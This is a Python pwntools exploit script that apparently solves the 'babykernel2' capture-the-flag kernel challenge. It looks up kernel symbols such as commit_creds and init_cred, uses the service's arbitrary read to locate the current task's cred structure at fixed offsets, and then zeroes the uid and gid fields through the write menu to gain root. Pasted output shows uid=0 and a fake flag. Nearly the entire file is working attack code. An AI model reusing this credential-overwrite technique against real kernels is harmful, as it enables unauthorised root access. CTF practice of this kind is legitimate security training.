#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

vmlinux = ELF("./vmlinux",checksec = False)

pkc = vmlinux.sym['prepare_kernel_cred']
log.info("prepare_kernel_cred : "+hex(pkc))

cc = vmlinux.sym['commit_creds']
log.info("commit_creds : "+hex(cc))

init_task = vmlinux.sym['init_task']
log.info("init_task : "+hex(init_task))

init_cred = vmlinux.sym['init_cred']
log.info("init_cred : "+hex(init_cred))

ctp = vmlinux.sym['current_task']
log.info("current_task_pointer : "+hex(ctp))

pause()

RHOST = "babykernel2.forfuture.fluxfingers.net"
RPORT = 1337
LHOST = "127.0.0.1"
LPORT = 7777

p = None
choose = sys.argv.pop(1) if len(sys.argv) > 1 else '?'
if choose in 'remote':
    p = remote(*{'remote': (RHOST, RPORT)}[choose])

if choose in 'local':
	p = remote(*{'local': (LHOST, LPORT)}[choose])

'''
/* 1000      |     8 */    unsigned long maj_flt;
/* 1008      |     8 */    const struct cred *ptracer_cred;
/* 1016      |     8 */    const struct cred *real_cred;
/* 1024      |     8 */    const struct cred *cred;
'''

def read(addr):
	p.recvuntil("----- Menu -----")
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("> ")
	p.sendline(hex(addr))
	p.recvuntil("We're back. Our scouter says the power level is: ", drop=True)
	return int(p.recvline(), 16)

'''
ptype /o struct cred
/* offset    |  size */  type = struct cred {
/*    0      |     4 */    atomic_t usage;
/*    4      |     4 */    kuid_t uid;
/*    8      |     4 */    kgid_t gid;
/*   12      |     4 */    kuid_t suid;
/*   16      |     4 */    kgid_t sgid;
/*   20      |     4 */    kuid_t euid;
/*   24      |     4 */    kgid_t egid;
/*   28      |     4 */    kuid_t fsuid;
/*   32      |     4 */    kgid_t fsgid;
/*   36      |     4 */    unsigned int securebits;
/*   40      |     8 */    kernel_cap_t cap_inheritable;
'''

current_task_ptr = ctp
current_task = int(read(current_task_ptr))

real_cred = int(read(current_task + 1016))
cred = int(read(current_task + 1024))

log.info("cred : "+hex(cred))
log.info("real_cred : "+hex(real_cred))

for i in range(0x4):
	p.sendline("2")
	p.recvuntil("> ")
	p.sendline(hex(cred+0x4+8*i))
	p.recvuntil("> ")
	p.sendline(hex(0))
	p.recvuntil("> ")
	p.sendline(str(3))
	p.recvuntil("> ")
	p.sendline(str(4))
	p.recvuntil("> ")
	p.sendline("flag")

'''
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> uid=0(root) gid=0(root) groups=1000(user)
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> Which file are we trying to read?
> Here are your 0x10 bytes contents:
flag{fake_flag}
'''

p.interactive()